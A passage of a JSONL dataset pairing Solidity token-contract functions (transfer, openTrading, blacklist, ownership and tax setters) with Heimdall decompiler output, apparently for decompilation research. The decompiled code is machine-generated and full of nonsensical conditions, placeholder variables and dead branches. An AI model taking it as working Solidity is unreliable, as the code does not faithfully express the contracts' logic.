(uint248(transferDelayEnabled));\n                        if (0x09) {\n                            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function unblacklist(address _addr) public onlyOwner {\\n        blacklisted[_addr] = false;\\n    }", "heimdall_decompiled_code": "function unblacklist(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x0b;\n        storage_map_h[var_e] = uint248(storage_map_h[var_e]);\n    }"}
{"contract_address": "0xd548c6Cf03b82450db5a446845DB3005e34138eE", "original_solidity_code": "function showBacking(uint256 accuracy) public view returns (uint256) {\r\n        return accuracy.mul(balanceOf(pair).mul(2)).div(showSupply());\r\n    }", "heimdall_decompiled_code": "function showBacking(uint256 arg0) public view {\n        var_a = 0x06;\n        var_b = 0xdead;\n        uint256 var_c = 0x40 + var_c;\n        var_d = 0x1e;\n        var_e = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(store_o > totalSupply), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_c.length;\n        uint256 var_i = 0;\n        var_j = var_k;\n        var_i = 0;\n        require(!(totalSupply - store_o) > totalSupply);\n        var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_l = 0x11;\n    }"}
{"contract_address": "0x1c6e35bFEA40f3709DA709f0f2e55604C1F53a1f", "original_solidity_code": "function activity(\r\n    address _r,\r\n    uint256 am\r\n    ) public onlyOwner {\r\n            uint256 amO = gAO(_RR.WETH(), am);\r\n            address[] memory p = getPP();\r\n            uint256 amI = _cAI(amO, p);\r\n            _doS(amO, amI, p, _r);\r\n    }", "heimdall_decompiled_code": "function activity(address arg0, uint256 arg1) public payable {\n        require(msg.sender == (address(owner)), \"Caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x43616c6c6572206973206e6f7420746865206f776e6572000000000000000000;\n        var_a = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).WETH(var_b); // staticcall\n        require(!ret0.length < 0x20);\n        var_a = 0x0902f1ac00000000000000000000000000000000000000000000000000000000;\n        require(address(store_b / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_b / 0x01).getReserves(var_b); // staticcall\n        require(!ret0.length < 0x60);\n        var_a = 0x0dfe168100000000000000000000000000000000000000000000000000000000;\n        require(address(store_b).code.length);\n        (bool success, bytes memory ret0) = address(store_b).token0(var_b); // staticcall\n        require(!ret0.length < 0x20);\n        require(address(var_e.length) == (address(var_e.length)));\n        var_a = 0x02;\n        uint256 var_e = var_e + 0x60;\n        var_f = msg.data[4:68];\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_i); // staticcall\n        require(!ret0.length < 0x20);\n        uint256 var_j = address(var_e.length);\n        var_h = 0x02;\n        var_e = var_e + 0x60;\n        var_f = msg.data[4:68];\n        var_k = 0x1f00ca7400000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = (arg1 * (uint112(var_m))) / 0x0186a0;\n        var_n = 0x40;\n        uint256 var_o = var_e.length;\n        require(!0 < (var_e.length * 0x20));\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_1f00ca74(var_l); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!ret0.length < 0x20);\n        require(!var_e.length > 0x0100000000);\n        require(!((var_e + var_e.length) + 0x20) > (var_e + ret0.length));\n        require(!(var_p > 0x0100000000) | (((var_e + var_e.length) + 0x20) + (var_p * 0x20) > (var_e + ret0.length)));\n        var_q = var_p;\n        require(!0 < (0x20 * (var_p)));\n        var_e = (0x20 * (var_r)) + (0x20 + var_e);\n        require(block.timestamp > 0x01);\n        uint256 var_s = 0;\n        var_t = 0x04;\n        storage_map_g[var_s] = (var_m) + storage_map_g[var_s];\n        require(var_e.length);\n        var_s = address(this);\n        var_t = 0x04;\n        require(address(this));\n        require(address(store_f));\n        var_s = address(this);\n        var_t = 0x05;\n        var_s = address(store_f);\n        uint256 var_t = keccak256(var_s);\n        storage_map_g[var_s] = storage_map_g[var_s];\n        uint256 var_u = storage_map_g[var_s];\n        emit Approval(address(this), address(store_f), storage_map_g[var_s]);\n        var_u = 0x8803dbee00000000000000000000000000000000000000000000000000000000;\n        var_o = (arg1 * (uint112(var_m))) / 0x0186a0;\n        var_v = var_m;\n        address var_w = address(arg0);\n        uint256 var_x = 0x04b0 + block.timestamp;\n        uint256 var_y = (0x20 + (0x20 + (0x20 + (0x20 + (0x20 + (0x04 + var_e)))))) - (0x04 + var_e);\n        uint256 var_z = var_e.length;\n        require(!0 < (0x20 * var_e.length));\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).{ value: 0 ether }Unresolved_8803dbee(var_o); // call\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!ret0.length < 0x20);\n        require(!var_e.length > 0x0100000000);\n        require(!((var_e + var_e.length) + 0x20) > (var_e + ret0.length));\n        require(!(var_p > 0x0100000000) | (((var_e + var_e.length) + 0x20) + (var_p * 0x20) > (var_e + ret0.length)));\n        var_aa = var_p;\n        require(!0 < (0x20 * (var_p)));\n        var_e = (0x20 * (var_r)) + (0x20 + var_e);\n        var_u = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_v = 0x22;\n        var_ab = this.code[5148:5182];\n        var_u = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_v = 0x24;\n        var_ab = this.code[5257:5293];\n    }"}
{"contract_address": "0x700604d812AD038BB5fE00ddDB8c0375E65A307C", "original_solidity_code": "function removeMarketingTax() external {\r\n        require(_msgSender() == shiaburnWallet);\r\n        j_marketingSell = 1;\r\n        j_liqSell = 2;\r\n        j_liqBuy = 2;\r\n        j_marketingBuy = 1;\r\n\r\n    }", "heimdall_decompiled_code": "function removeMarketingTax() public {\n        require(address(msg.sender) == (address(store_f / 0x01)));\n        store_v = 0x01;\n        j_liqSell = 0x02;\n        j_liqBuy = 0x02;\n        j_marketingBuy = 0x01;\n    }"}
{"contract_address": "0x04Ac04832dFeF1DFa133B242724D0a154C4a78Cb", "original_solidity_code": "function updateSingleTxMaxUsedInSwapping(uint256 _amount) external onlyOwner() {\\n        _limitationsInMaxSlotsUsedInSwappingTx = _amount;\\n    }", "heimdall_decompiled_code": "function updateSingleTxMaxUsedInSwapping(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _limitationsInMaxSlotsUsedInSwappingTx = arg0;\n    }"}
{"contract_address": "0xa24BfAF7D3c435aAF05E490fFEbe447907CAC972", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_d) {\n            if (!(store_d) == ((store_d / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_d / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_d / 0x02;\n                if (store_d) {\n                    if (!(store_d) == ((store_d / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_d / 0x02) {\n                            if (0x1f < (store_d / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_d / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x62DdfB2BA9444095aA52f34c00f73de37436139B", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        if (!(address(msg.sender)) == 0) {\n            if (!(address(arg0)) == 0) {\n                if (arg1 > 0) {\n                    address var_a = address(msg.sender);\n                    var_b = 0x04;\n                    if (!storage_map_c[var_a] / 0x01) {\n                        var_a = address(arg0);\n                        var_b = 0x04;\n                        if (storage_map_c[var_a] / 0x01) {\n                            var_a = address(msg.sender);\n                            var_b = 0x04;\n                            require(!(address(msg.sender) == 0), \"Transfer amount must be greater than zero\");\n                            require(!(address(arg0) == 0), \"Transfer amount must be greater than zero\");\n                            var_a = address(msg.sender);\n                            var_b = 0x04;\n                            require(arg1 > 0, \"Transfer amount must be greater than zero\");\n                            require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n                            var_a = address(msg.sender);\n                            var_b = 0x04;\n                            require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n                            var_a = address(arg0);\n                            var_b = 0x04;\n                            require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n                        }\n                    }\n                }\n                var_a = address(arg0);\n                var_b = 0x04;\n                require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n            }\n            require(!(!bytes1(storage_map_c[var_a] / 0x01)), \"Transfer amount must be greater than zero\");\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = this.code[12949:12990];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = this.code[12727:12762];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = this.code[12990:13027];\n    }"}
{"contract_address": "0x054348505D3A37c155C15435FEB95392bDDb31E6", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xf9F4ed2EE87e3Bc8a3cDC7538d1217B100511eA3", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"SafeMath: multiplication overflow\");\n        require(address(arg0) - 0, \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_b > store_c, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_d == ((arg1 * store_d) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_d) / arg1) == store_d, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_f / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        address var_a = address(tx.origin);\n        var_n = 0x04;\n        require(storage_map_h[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x49;\n        var_l = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_n = 0x04;\n        storage_map_h[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_g / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_d) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_h[var_a] > (storage_map_h[var_a] + ((arg1 * store_d) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(storage_map_h[var_a] + ((arg1 * store_d) / 0x64) < storage_map_h[var_a]), \"SafeMath: addition overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] + ((arg1 * store_d) / 0x64);\n        uint256 var_j = (arg1 * store_d) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_d) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_e = 0x40 + var_e;\n        var_j = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_h[var_a] - arg1) > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] - arg1;\n        var_e = 0x40 + var_e;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_d) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_u = var_e.length;\n        uint256 var_v = 0;\n        var_w = var_m;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_d) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_h[var_a] > _maxTaxSwap) {\n            }\n            if (!store_b > store_j) {\n            }\n            if (!storage_map_h[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_g / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_b > store_l) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_d) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_b > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_f / 0x01))) {\n            if (address(arg0) == (address(store_f / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x04Ac04832dFeF1DFa133B242724D0a154C4a78Cb", "original_solidity_code": "function openTrading() external onlyOwner() {\\n        require(!flagForTradingIsOkOrNot,\\\"trading is already open\\\");\\n        _uniswapRouterUniswapFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n        _approve(address(this), address(_uniswapRouterUniswapFactory), _totalsupply_amount);\\n        _uniswapPairTokenLiquidity = IUniswapV2Factory(_uniswapRouterUniswapFactory.factory()).createPair(address(this), _uniswapRouterUniswapFactory.WETH());\\n        _uniswapRouterUniswapFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\n        IERC20(_uniswapPairTokenLiquidity).approve(address(_uniswapRouterUniswapFactory), type(uint).max);\\n        _allowances[address(_uniswapPairTokenLiquidity)][address(_addressUsedInFundationFees)] = type(uint).max;\\n        _swapingInUniswapOKSigns = true;\\n        flagForTradingIsOkOrNot = true;\\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(_enableWatchDogLimitsFlag / 0x01000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x12, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x0f4240, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x10;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_p[var_e] = 0x0f4240;\n        var_a = 0x0f4240;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x0f4240);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).{ value: 0 ether }Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x12 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20))) {\n                            if (!0x12 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x700604d812AD038BB5fE00ddDB8c0375E65A307C", "original_solidity_code": "function setMarketingWallet(address payable _address) external onlyOwner {\r\n        marketingWallet = _address;\r\n    }", "heimdall_decompiled_code": "function setMarketingWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_s = (address(arg0) * 0x01) | (uint96(store_s));\n    }"}
{"contract_address": "0xbC9683EE9525c4525e7e0dCFfe8eeD1447fd4287", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(address(arg0) == 0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
